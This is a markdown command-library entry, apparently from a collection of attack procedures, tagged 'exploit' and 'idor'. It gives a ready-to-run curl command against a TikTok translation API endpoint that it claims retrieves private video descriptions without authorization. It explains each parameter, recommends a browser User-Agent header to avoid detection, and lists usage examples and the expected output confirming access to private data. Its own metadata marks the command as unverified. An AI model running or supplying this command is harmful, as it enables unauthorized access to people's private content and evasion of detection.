---
data: >-
  curl -X GET
  "https://api.tiktok.com/translate?video_id=PRIVATE_VIDEO_ID&lang=en" -H
  "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
tags:
  - api
  - exploit
  - idor
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: f81c8176-db79-480b-865e-fb44f7fe10e3
created_at: '2025-12-14T17:32:39.518Z'
updated_at: '2025-12-14T17:32:39.518Z'
verified: false
validated: true
submitted: true
---
# curl-idor-access

## Command

```bash
curl -X GET "https://api.tiktok.com/translate?video_id=PRIVATE_VIDEO_ID&lang=en" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Description

This command uses curl to send an HTTP GET request to the TikTok translation API, exploiting an IDOR vulnerability by specifying a private video ID to retrieve its description without authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `video_id=PRIVATE_VIDEO_ID` | The target video ID (replace with private ID) | Yes |
| `lang=en` | Translation language (e.g., English) | Yes |
| `-H "User-Agent: ..."` | Mimics a browser to avoid basic detection | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.tiktok.com/translate?video_id=1234567890123456789&lang=en"
```

### Advanced Usage

```bash
curl -X GET "https://api.tiktok.com/translate?video_id=PRIVATE_VIDEO_ID&lang=en" -H "User-Agent: Mozilla/5.0" -v
```

(Adds verbose output with `-v` for debugging headers and responses.)

## Expected Output

Successful execution returns a JSON response like `{"status": "success", "description": "Private video text here"}`, confirming access to private data. Errors would indicate invalid endpoints or rate limits.

## Related

- [[Related Procedure: Exploit-IDOR-in-TikTok-Translation-API]]
